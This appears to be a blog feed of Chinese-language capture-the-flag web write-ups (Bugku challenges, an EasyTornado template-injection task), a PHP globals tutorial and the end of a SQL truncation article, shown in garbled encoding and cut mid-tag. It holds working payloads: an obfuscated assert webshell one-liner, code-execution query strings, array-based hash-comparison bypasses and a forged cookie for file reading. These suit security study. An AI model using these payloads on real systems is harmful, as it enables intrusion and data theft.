¼ã€‚çŽ°åœ¨ï¼Œå¦‚æžœä½¿ç”¨ç”¨æˆ·åâ€œvampireâ€å’Œå¯†ç â€œrandom_passâ€ç™»å½•çš„è¯ï¼Œåˆ™æ‰€æœ‰æœç´¢è¯¥ç”¨æˆ·åçš„SELECTæŸ¥è¯¢éƒ½å°†è¿”å›žç¬¬ä¸€ä¸ªæ•°æ®è®°å½•ï¼Œä¹Ÿå°±æ˜¯åŽŸå§‹çš„æ•°æ®è®°å½•ã€‚è¿™æ ·çš„è¯ï¼Œæ”»å‡»è€…å°±èƒ½å¤Ÿä»¥åŽŸå§‹ç”¨æˆ·èº«ä»½ç™»å½•ã€‚è¿™ä¸ªæ”»å‡»å·²ç»åœ¨MySQLå’ŒSQLiteä¸ŠæˆåŠŸé€šè¿‡æµ‹è¯•ã€‚æˆ‘ç›¸ä¿¡åœ¨å…¶ä»–æƒ…å†µä¸‹ä¾æ—§é€‚ç”¨ã€‚</p><h4 id="é˜²å¾¡æ‰‹æ®µ"><a href="#é˜²å¾¡æ‰‹æ®µ" class="headerlink" title="é˜²å¾¡æ‰‹æ®µ"></a>é˜²å¾¡æ‰‹æ®µ</h4><p>æ¯«æ— ç–‘é—®ï¼Œåœ¨è¿›è¡Œè½¯ä»¶å¼€å‘æ—¶ï¼Œéœ€è¦å¯¹æ­¤ç±»å®‰å…¨æ¼æ´žå¼•èµ·æ³¨æ„ã€‚æˆ‘ä»¬å¯é‡‡å–ä»¥ä¸‹å‡ é¡¹æŽªæ–½è¿›è¡Œé˜²å¾¡ï¼š</p><ol><li>å°†è¦æ±‚æˆ–è€…é¢„æœŸå…·æœ‰å”¯ä¸€æ€§çš„é‚£äº›åˆ—åŠ ä¸ŠUNIQUEçº¦æŸã€‚å®žé™…ä¸Šè¿™æ˜¯ä¸€ä¸ªæ¶‰åŠè½¯ä»¶å¼€å‘çš„é‡è¦è§„åˆ™ï¼Œå³ä½¿ä½ çš„ä»£ç æœ‰ç»´æŒå…¶å®Œæ•´æ€§çš„åŠŸèƒ½ï¼Œä¹Ÿåº”è¯¥æ°å½“çš„å®šä¹‰æ•°æ®ã€‚ç”±äºŽâ€™usernameâ€™åˆ—å…·æœ‰UNIQUEçº¦æŸï¼Œæ‰€ä»¥ä¸èƒ½æ’å…¥å¦ä¸€æ¡è®°å½•ã€‚å°†ä¼šæ£€æµ‹åˆ°ä¸¤ä¸ªç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”INSERTæŸ¥è¯¢å°†å¤±è´¥ã€‚</li><li>æœ€å¥½ä½¿ç”¨â€™idâ€™ä½œä¸ºæ•°æ®åº“è¡¨çš„ä¸»é”®ã€‚å¹¶ä¸”æ•°æ®åº”è¯¥é€šè¿‡ç¨‹åºä¸­çš„idè¿›è¡Œè·Ÿè¸ª</li><li>ä¸ºäº†æ›´åŠ å®‰å…¨ï¼Œè¿˜å¯ä»¥ç”¨æ‰‹åŠ¨è°ƒæ•´è¾“å…¥å‚æ•°çš„é™åˆ¶é•¿åº¦ï¼ˆä¾ç…§æ•°æ®åº“è®¾ç½®ï¼‰</li></ol><p><a href="https://www.freebuf.com/articles/web/124537.html">https://www.freebuf.com/articles/web/124537.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web24-PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</title>
      <link href="2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/"/>
      <url>2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/blog/source_posts\Bugkuï¼šWeb24-PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€\è®¿é—®.png" alt="è®¿é—®"></p><p><img src="/2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/blog/source_posts\Bugkuï¼šWeb24-PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€\f12.png" alt="f12"></p><p><img src="/2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/blog/source_posts\Bugkuï¼šWeb24-PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€\code.png" alt="code"></p><pre><code>?v1[]=QNKCDZO&amp;v2[]=s878926199a&amp;v3[]=</code></pre><pre><code>?v1[]=aaa&amp;v2[]=aa&amp;v3[]=</code></pre><pre><code>?v1[]=1&amp;v2[]=2&amp;v3[]=</code></pre><pre><code>flag{5f9c370a78e9b4b4436825cb986784e4}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web22-è¿‡ç‹—ä¸€å¥è¯</title>
      <link href="2021/04/03/bugku-web22-guo-gou-yi-ju-hua/"/>
      <url>2021/04/03/bugku-web22-guo-gou-yi-ju-hua/</url>
      
        <content type="html"><![CDATA[<h3 id="PHP-scandir-å‡½æ•°"><a href="#PHP-scandir-å‡½æ•°" class="headerlink" title="PHP scandir() å‡½æ•°"></a>PHP scandir() å‡½æ•°</h3><p>å®žä¾‹ï¼š</p><pre><code>&lt;?php$dir = "/images/";// Sort in ascending order - this is default$a = scandir($dir);// Sort in descending order$b = scandir($dir,1);print_r($a);print_r($b);?&gt;</code></pre><p>ç»“æžœï¼š</p><pre><code>Array([0] =&gt; .[1] =&gt; ..[2] =&gt; cat.gif[3] =&gt; dog.gif[4] =&gt; horse.gif[5] =&gt; myimages)Array([0] =&gt; myimages[1] =&gt; horse.gif[2] =&gt; dog.gif[3] =&gt; cat.gif[4] =&gt; ..[5] =&gt; .) </code></pre><h4 id="å®šä¹‰å’Œç”¨æ³•"><a href="#å®šä¹‰å’Œç”¨æ³•" class="headerlink" title="å®šä¹‰å’Œç”¨æ³•"></a>å®šä¹‰å’Œç”¨æ³•</h4><p>scandir() å‡½æ•°è¿”å›žæŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</p><h4 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><pre><code>scandir(*directory,sorting_order,context*);</code></pre><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>directory</em></td><td>å¿…éœ€ã€‚è§„å®šè¦æ‰«æçš„ç›®å½•ã€‚</td></tr><tr><td><em>sorting_order</em></td><td>å¯é€‰ã€‚è§„å®šæŽ’åˆ—é¡ºåºã€‚é»˜è®¤æ˜¯ 0ï¼Œè¡¨ç¤ºæŒ‰å­—æ¯å‡åºæŽ’åˆ—ã€‚å¦‚æžœè®¾ç½®ä¸º SCANDIR_SORT_DESCENDING æˆ–è€… 1ï¼Œåˆ™è¡¨ç¤ºæŒ‰å­—æ¯é™åºæŽ’åˆ—ã€‚å¦‚æžœè®¾ç½®ä¸º SCANDIR_SORT_NONEï¼Œåˆ™è¿”å›žæœªæŽ’åˆ—çš„ç»“æžœã€‚</td></tr><tr><td><em>context</em></td><td>å¯é€‰ã€‚è§„å®šç›®å½•å¥æŸ„çš„çŽ¯å¢ƒã€‚context æ˜¯å¯ä¿®æ”¹ç›®å½•æµçš„è¡Œä¸ºçš„ä¸€å¥—é€‰é¡¹ã€‚</td></tr></tbody></table><h2 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h2><p>æç¤ºï¼š</p><pre><code>&lt;?php $poc = "a#s#s#e#r#t";$poc_1 = explode("#", $poc);$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];$poc_2($_GET['s'])?&gt;</code></pre><p> exlpde()åˆ†å‰²a#s#s#e#r#tä¸ºassertï¼Œä½¿ç”¨assert()å‡½æ•°çš„è§£æžä¼ è¿›æ¥çš„sä¸²ï¼Œassertæœ‰ä»£ç æ‰§è¡Œæ¼æ´žã€‚</p><pre><code>?s=print_r(scandir('./'))</code></pre><p><img src="/2021/04/03/bugku-web22-guo-gou-yi-ju-hua/blog/source_posts\Bugkuï¼šWeb22-è¿‡ç‹—ä¸€å¥è¯\s.png" alt="s"></p><p>è®¿é—®</p><p><img src="/2021/04/03/bugku-web22-guo-gou-yi-ju-hua/blog/source_posts\Bugkuï¼šWeb22-è¿‡ç‹—ä¸€å¥è¯\flaga15808abee46a1d5.txt.png" alt="flaga15808abee46a1d5.txt"></p><p>æˆ–è€…ï¼š</p><pre><code>?s=print_r(glob("*.*"))</code></pre><pre><code>?s=print_r(glob('*.txt'))</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web20-cookieæ¬ºéª—</title>
      <link href="2021/04/03/bugku-web20-cookie-qi-pian/"/>
      <url>2021/04/03/bugku-web20-cookie-qi-pian/</url>
      
        <content type="html"><![CDATA[<pre><code>index.php?line=&amp;filename=a2V5cy50eHQ=</code></pre><p>ä¿®æ”¹lineçš„å€¼</p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugkuï¼šWeb20-cookieæ¬ºéª—\line=2.png" alt="line=2"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugkuï¼šWeb20-cookieæ¬ºéª—\line=3.png" alt="line=3"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugkuï¼šWeb20-cookieæ¬ºéª—\line=4.png" alt="line=4"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugkuï¼šWeb20-cookieæ¬ºéª—\line=5.png" alt="line=5"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugkuï¼šWeb20-cookieæ¬ºéª—\line=6.png" alt="line=6"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugkuï¼šWeb20-cookieæ¬ºéª—\line=7.png" alt="line=7"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugkuï¼šWeb20-cookieæ¬ºéª—\line=8.png" alt="line=8"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugkuï¼šWeb20-cookieæ¬ºéª—\line=10.png" alt="line=10"></p><p>æ‹¼æŽ¥ä»¥åŽï¼š</p><pre><code>&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',); if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin'){$file_list[2]='keys.php';}if(in_array($file, $file_list)){ $fa = file($file);echo $fa[$line];}?&gt;</code></pre><p>æ‰€ä»¥å½“cookieä¸­</p><pre><code>margin=margin</code></pre><p>è®¿é—®keys.txt</p><p>hackerä¼ªé€ cookie</p><p>å¾—åˆ°flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web13-çœ‹çœ‹æºä»£ç </title>
      <link href="2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/"/>
      <url>2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/blog/source_posts\Bugkuï¼šWeb13-çœ‹çœ‹æºä»£ç \æè¿°.png" alt="æè¿°"></p><p>f12</p><p><img src="/2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/blog/source_posts\Bugkuï¼šWeb13-çœ‹çœ‹æºä»£ç \f12.png" alt="f12"></p><p>è§£ç å¾—</p><pre><code>function checkSubmit(){  var a = document.getElementById("password");  if("undefined"!=typeof a){    if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)return!0;    alert("Error");    a.focus();    return!1    }}document.getElementById("levelQuest").onsubmit = checkSubmit;</code></pre><p>å‘é€67d709b2b54aa2aa648cf6e87a7114f1å¾—åˆ°flag</p><pre><code>flag{6917495a0e17df3f54d72aaf72c64645}</code></pre><p><img src="/2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/blog/source_posts\Bugkuï¼šWeb13-çœ‹çœ‹æºä»£ç \flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web9</title>
      <link href="2021/03/30/bugku-web9/"/>
      <url>2021/03/30/bugku-web9/</url>
      
        <content type="html"><![CDATA[<pre><code>flag In the variable ! &lt;?php  error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args'])){    $args = $_GET['args'];    if(!preg_match("/^\w+$/",$args)){        die("args error!");    }    eval("var_dump($$args);");}?&gt; </code></pre><p>flag in the variable å°±è¯´äº†flagåœ¨å˜é‡ä¸­<br>error_reporting(0); å…³é—­æŠ¥é”™æç¤º<br>include â€œflag1.phpâ€; æ­¤æ—¶å¼•å…¥flag1çš„ä»£ç <br>highlight_file(<em>file</em>); é«˜äº®æ˜¾ç¤º<br>if(isset($_GET[â€˜argsâ€™])) æ¡ä»¶åˆ¤æ–­ getæ–¹æ³•ä¼ é€’çš„argså‚æ•°æ˜¯å¦å­˜åœ¨<br>è‹¥å­˜åœ¨ç„¶åŽèµ‹å€¼<br>preg_match() å‡½æ•° â€” æ‰§è¡ŒåŒ¹é…æ­£åˆ™è¡¨è¾¾å¼<br>/^å¼€å§‹, \wè¡¨ç¤ºä»»æ„ä¸€ä¸ªå•è¯å­—ç¬¦ï¼Œå³[a-zA-Z0-9_] ,+å°†å‰é¢çš„å­—ç¬¦åŒ¹é…ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œ$/ç»“å°¾<br>die(â€œargs error!â€); è¾“å‡º args error!<br>eval(â€œvar_dump($$args);â€); å°†å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç æ‰§è¡Œç»“å°¾åŠ åˆ†å·<br>var_dump()å‡½æ•° æ˜¾ç¤ºå…³äºŽä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æž„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»åž‹ä¸Ž<br>å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æž„ã€‚</p><p>$$args å¯ä»¥ç†è§£ä¸º$($args)</p><p>eval()å‡½æ•°å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ž.</p><p>flag In the variable å°±è¯´äº†flagåœ¨å˜é‡ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³åŠžæ³•ç”¨å‘½ä»¤è¾“å‡ºå˜é‡å³å¯ï¼Œæˆ‘ä»¬æƒ³åˆ°æž„é€  phpä¸­è¶…å…¨å±€å˜é‡ $GLOBALS<br>PHP åœ¨åä¸º $GLOBALS[index]* çš„æ•°ç»„ä¸­å­˜å‚¨äº†æ‰€æœ‰å…¨å±€å˜é‡ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚*<br>å³ .php?args=GLOBALS</p><p>eval(â€œvar_dump($$args);â€);    </p><pre><code>1</code></pre><p>é¦–å…ˆå°† var_dump($$args); å½“æˆä»£ç æ‰§è¡Œ var_dump($GLOBALS);</p><p>var_dump()å‡½æ•°å°†$GLOBALSæ•°ç»„ä¸­å­˜æ”¾çš„æ‰€æœ‰å˜é‡ä»¥æ•°ç»„çš„æ–¹å¼è¾“å‡º å¾—åˆ°flagã€‚<br><img src="/2021/03/30/bugku-web9/blog/source_posts\Bugkuï¼šWeb9\1.png" alt="1"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP:å…¨å±€å˜é‡globalå’Œ$GLOBALSè¯¦è§£</title>
      <link href="2021/03/29/php-quan-ju-bian-liang-global-he-globals-xiang-jie/"/>
      <url>2021/03/29/php-quan-ju-bian-liang-global-he-globals-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p>å˜é‡çš„èŒƒå›´å³å®ƒå®šä¹‰çš„ä¸Šä¸‹æ–‡èƒŒæ™¯ï¼ˆä¹Ÿå°±æ˜¯å®ƒçš„ç”Ÿæ•ˆèŒƒå›´ï¼‰ã€‚å¤§éƒ¨åˆ†çš„ PHP å˜é‡åªæœ‰ä¸€ä¸ªå•ç‹¬çš„èŒƒå›´ã€‚è¿™ä¸ªå•ç‹¬çš„èŒƒå›´è·¨åº¦åŒæ ·åŒ…å«äº† include å’Œ require å¼•å…¥çš„æ–‡ä»¶ã€‚</p><pre><code>$a = 1;include 'b.php';</code></pre><p>è¿™é‡Œå˜é‡ $a å°†ä¼šåœ¨åŒ…å«æ–‡ä»¶ b.inc ä¸­ç”Ÿæ•ˆã€‚ä½†æ˜¯ï¼Œåœ¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä¸­ï¼Œä¸€ä¸ªå±€éƒ¨å‡½æ•°èŒƒå›´å°†è¢«å¼•å…¥ã€‚ä»»ä½•ç”¨äºŽå‡½æ•°å†…éƒ¨çš„å˜é‡æŒ‰ç¼ºçœæƒ…å†µå°†è¢«é™åˆ¶åœ¨å±€éƒ¨å‡½æ•°èŒƒå›´å†…ã€‚ä¾‹å¦‚</p><pre><code>$a = 1; /* global scope */function Test(){    echo $a; /* reference to local scope variable */}Test();</code></pre><p>è¿™ä¸ªè„šæœ¬ä¸ä¼šæœ‰ä»»ä½•è¾“å‡ºï¼Œå› ä¸º echo è¯­å¥å¼•ç”¨äº†ä¸€ä¸ªå±€éƒ¨ç‰ˆæœ¬çš„å˜é‡ $aï¼Œè€Œä¸”åœ¨è¿™ä¸ªèŒƒå›´å†…ï¼Œå®ƒå¹¶æ²¡æœ‰è¢«èµ‹å€¼ã€‚<strong>PHP ä¸­å…¨å±€å˜é‡åœ¨å‡½æ•°ä¸­ä½¿ç”¨æ—¶å¿…é¡»å£°æ˜Žä¸º globalã€‚</strong><br>1.global</p><p>ã€€ã€€åœ¨å‡½æ•°ä½“å†…å®šä¹‰çš„globalå˜é‡,å®šä¹‰åŽå¯ä»¥å…¨å±€ä½¿ç”¨ä½¿ç”¨,åœ¨å‡½æ•°ä½“å¤–å®šä¹‰çš„globalå˜é‡ä¸èƒ½åœ¨å‡½æ•°ä½“å†…ä½¿ç”¨,å…·ä½“çœ‹ä¸‹é¢ç¤ºä¾‹ã€‚</p><p>ï¼ˆ1ï¼‰åœ¨å‡½æ•°ä½“å†…å®šä¹‰globalå˜é‡ï¼Œå‡½æ•°ä½“å†…å¯ä»¥ä½¿ç”¨ã€‚</p><pre><code>&lt;?php$a = 1;$b = 2;function Sum(){    global $a, $b; //åœ¨é‡Œé¢å£°æ˜Žä¸ºå…¨å±€å˜é‡    $b = $a + $b;}Sum();echo $b;//ç»“æžœ 3//ä»¥ä¸Šè„šæœ¬çš„è¾“å‡ºå°†æ˜¯â€œ3â€ã€‚åœ¨å‡½æ•°ä¸­å£°æ˜Žäº†å…¨å±€å˜é‡ $a å’Œ $b ä¹‹åŽï¼Œå¯¹ä»»ä¸€å˜é‡çš„æ‰€æœ‰å¼•ç”¨éƒ½ä¼šæŒ‡å‘å…¶å…¨å±€ç‰ˆæœ¬ã€‚//å¯¹äºŽä¸€ä¸ªå‡½æ•°èƒ½å¤Ÿå£°æ˜Žçš„å…¨å±€å˜é‡çš„æœ€å¤§ä¸ªæ•°ï¼ŒPHP æ²¡æœ‰é™åˆ¶ã€‚</code></pre><p>ï¼ˆ2ï¼‰åœ¨å‡½æ•°ä½“å¤–å®šä¹‰globalå˜é‡ï¼Œå‡½æ•°ä½“å†…ä¸å¯ä»¥ä½¿ç”¨ã€‚</p><pre><code>global $a;$a = 3;function test() {    var_dump($a);    var_dump($GLOBALS);die;}test();//ç»“æžœNotice: Undefined variable: a in /users/kano/home/ts/123.php on line 5Call Stack /users/kano/home/ts/123.php:5:null/users/kano/home/ts/123.php:6:int 3// å¯ä»¥çœ‹åˆ°å…¶å®žå…¨å±€å˜é‡æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†æ˜¯åœ¨å‡½æ•°å†…å®šä¹‰çš„$aå¹¶éžå…¨å±€å˜é‡é‡Œçš„$a.å¦‚æžœè¦åœ¨å…¨å±€å˜é‡å†…è®¿é—®åˆ°$açš„å€¼ï¼Œå¯ä»¥é€šè¿‡$GLOBALS['a']æ¥è§£å†³ã€‚</code></pre><p>2.$GLOBALS<br>åœ¨ $GLOBALS æ•°ç»„ä¸­ï¼Œæ¯ä¸€ä¸ªå˜é‡ä¸ºä¸€ä¸ªå…ƒç´ ï¼Œé”®åå¯¹åº”å˜é‡åï¼Œå€¼å¯¹åº”å˜é‡çš„å†…å®¹ã€‚$GLOBALS ä¹‹æ‰€ä»¥åœ¨å…¨å±€èŒƒå›´å†…å­˜åœ¨ï¼Œæ˜¯å› ä¸º $GLOBALS æ˜¯ä¸€ä¸ªè¶…å…¨å±€å˜é‡ã€‚æ³¨æ„$GLOBALS çš„å†™æ³•ï¼Œæ¯”å¦‚å˜é‡$a1,å†™æ³•ä¸º$GLOBALS[â€˜a1â€™]ã€‚</p><p>ç¤ºä¾‹ï¼šå…ˆä½¿ç”¨globalå®šä¹‰</p><pre><code>$a = 1;$b = 2;function Sum(){    global $a, $b; //åœ¨é‡Œé¢å£°æ˜Žä¸ºå…¨å±€å˜é‡    $b = $a + $b;}Sum();echo $b;</code></pre><p>ä½¿ç”¨$GLOBALSå®šä¹‰å…¨å±€å˜é‡</p><pre><code>$a = 1;$b = 2;function Sum(){     $GLOBALS["b"] = $GLOBALS["a"] + $GLOBALS["b"];//å®šä¹‰å˜é‡æ—¶æ¯ä¸ªéƒ½è¦å®šä¹‰}Sum(); echo $b; //è¾“å‡ºç»“æžœä¸º2</code></pre><p>ä»¥ä¸Šä¸¤ç§å†™æ³•ç­‰ä»·ã€‚</p><pre><code>function test_global() {     global $var1, $var2;     //å£°æ˜Žä¸¤ä¸ªå…¨å±€å˜é‡$GLOBALS['var1']å’Œ$GLOBALS['var2'],    //å¹¶ä¸”åˆ›å»ºå…¨å±€å˜é‡çš„å¼•ç”¨    //$var1 $GLOBALS['var1'] æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€A    //$var2 $GLOBALS['var2'] æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€B    $var2 =&amp; $var1;     //å¼•ç”¨å…³ç³»æ”¹å˜ $var2æŒ‡å‘Aï¼Œæ‰€ä»¥$var2=å†…å­˜åœ°å€Açš„å†…å®¹    //è€Œ$GLOBALS['var2']ä»æŒ‡å‘B} function test_globals() {     $GLOBALS['var3'] =&amp; $GLOBALS['var1'];     //å…¨å±€å˜é‡var3å’Œvar1æŒ‡å‘å…±åŒçš„å†…å®¹ï¼Œ$var3=$var1} $var1 = 5; $var2 = $var3 = 0; test_global(); print $var2; //è¾“å‡ºç»“æžœä¸º0test_globals(); print $var3; //è¾“ç»“æžœä¸º05</code></pre><p>global å¼•ç”¨ å½“ç”¨ global $var å£°æ˜Žä¸€ä¸ªå˜é‡æ—¶å®žé™…ä¸Šå»ºç«‹äº†ä¸€ä¸ªåˆ°å…¨å±€å˜é‡çš„å¼•ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´å’Œè¿™æ ·åšæ˜¯ç›¸åŒçš„ï¼š</p><pre><code> $var =&amp; $GLOBALS["var"]; </code></pre><p><img src="/2021/03/29/php-quan-ju-bian-liang-global-he-globals-xiang-jie/blog/source_posts\PHPï¼šå…¨å±€å˜é‡globalå’Œ$GLOBALSè¯¦è§£\20181203180612917.jpg" alt="20181203180612917"></p><p>è¿™æ„å‘³ç€ï¼Œä¾‹å¦‚ï¼Œunset $var ä¸ä¼š unset å…¨å±€å˜é‡ã€‚</p><p>$this åœ¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ä¸­ï¼Œ$this æ°¸è¿œæ˜¯è°ƒç”¨å®ƒçš„å¯¹è±¡çš„å¼•ç”¨ã€‚</p><p>//ä¸‹é¢å†æ¥ä¸ªå°æ’æ›² phpä¸­å¯¹äºŽåœ°å€çš„æŒ‡å‘ï¼ˆç±»ä¼¼æŒ‡é’ˆï¼‰åŠŸèƒ½ä¸æ˜¯ç”±ç”¨æˆ·è‡ªå·±æ¥å®žçŽ°çš„ï¼Œæ˜¯ç”±Zendæ ¸å¿ƒå®žçŽ°çš„ï¼Œphpä¸­å¼•ç”¨é‡‡ç”¨çš„æ˜¯â€œå†™æ—¶æ‹·è´â€çš„åŽŸç†ï¼Œå°±æ˜¯é™¤éžå‘ç”Ÿå†™æ“ä½œï¼ŒæŒ‡å‘åŒä¸€ä¸ªåœ°å€çš„å˜é‡æˆ–è€…å¯¹è±¡æ˜¯ä¸ä¼šè¢«æ‹·è´çš„ã€‚</p><p>é€šä¿—çš„è®² 1:å¦‚æžœæœ‰ä¸‹é¢çš„ä»£ç  </p><pre><code> $a="ABC"; $b=$a; </code></pre><p>å…¶å®žæ­¤æ—¶ã€€$aä¸Ž$béƒ½æ˜¯æŒ‡å‘åŒä¸€å†…å­˜åœ°å€ã€€è€Œå¹¶ä¸æ˜¯$aä¸Ž$bå ç”¨ä¸åŒçš„å†…å­˜</p><p>ï¼’:å¦‚æžœåœ¨ä¸Šé¢çš„ä»£ç åŸºç¡€ä¸Šå†åŠ ä¸Šå¦‚ä¸‹ä»£ç  </p><pre><code> $a="EFG";</code></pre><p>ç”±äºŽ$aä¸Ž$bæ‰€æŒ‡å‘çš„å†…å­˜çš„æ•°æ®è¦é‡æ–°å†™ä¸€æ¬¡äº†ï¼Œæ­¤æ—¶Zendæ ¸å¿ƒä¼šè‡ªåŠ¨åˆ¤æ–­è‡ªåŠ¨ä¸º$bç”Ÿäº§ä¸€ä¸ª$açš„æ•°æ®æ‹·è´ï¼Œé‡æ–°ç”³è¯·ä¸€å—å†…å­˜è¿›è¡Œå­˜å‚¨</p><p><img src="/2021/03/29/php-quan-ju-bian-liang-global-he-globals-xiang-jie/blog/source_posts\PHPï¼šå…¨å±€å˜é‡globalå’Œ$GLOBALSè¯¦è§£\20181203180756852.jpg" alt="20181203180756852"><br>åŽŸæ–‡é“¾æŽ¥ï¼š<a href="https://blog.csdn.net/Kano_W/article/details/84776777">https://blog.csdn.net/Kano_W/article/details/84776777</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æŠ¤ç½‘æ¯:2018-EasyTornado</title>
      <link href="2021/03/28/hu-wang-bei-2018-easytornado/"/>
      <url>2021/03/28/hu-wang-bei-2018-easytornado/</url>
      
        <content type="html"><![CDATA[<p>è®¿é—®ç½‘ç«™ï¼š</p><p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/111.200.241.24448236.png" alt="111.200.241.24448236"></p><h4 id="flag-txt"><a href="#flag-txt" class="headerlink" title="flag.txt"></a>flag.txt</h4><p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/flag.txt.png" alt="flag.txt"></p><h4 id="welcome-txt"><a href="#welcome-txt" class="headerlink" title="welcome.txt"></a>welcome.txt</h4><p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/welcome.txt.png" alt="welcome.txt"></p><p>renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œæ¸²æŸ“å˜é‡åˆ°æ¨¡æ¿ä¸­ï¼Œå³å¯ä»¥é€šè¿‡ä¼ é€’ä¸åŒçš„å‚æ•°å½¢æˆä¸åŒçš„é¡µé¢ã€‚</p><h4 id="hints-txt"><a href="#hints-txt" class="headerlink" title="hints.txt"></a>hints.txt</h4><p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/hints.txt.png" alt="hints.txt"></p><p>filehash=md5(cookie_secret+md5(filename)) çŽ°åœ¨filename=/fllllllllllllagï¼Œåªéœ€è¦çŸ¥é“cookie_secretçš„æ—¢èƒ½è®¿é—®flagã€‚</p><p>æµ‹è¯•åŽå‘çŽ°è¿˜æœ‰ä¸€ä¸ªerrorç•Œé¢ï¼Œæ ¼å¼ä¸º/error?msg=Errorï¼Œæ€€ç–‘å­˜åœ¨æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡» ï¼ˆSSTIï¼‰<br> å°è¯•/error?msg= åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼Œdatetimeæ˜¯æŒ‡å‘pythonä¸­datetimeè¿™ä¸ªæ¨¡å—ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡ï¼Œå¯ä»¥å‚è€ƒTornadoå®˜æ–¹æ–‡æ¡£</p><p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/errormsg=%3C!--swig%EF%BF%BC2--%3E.png" 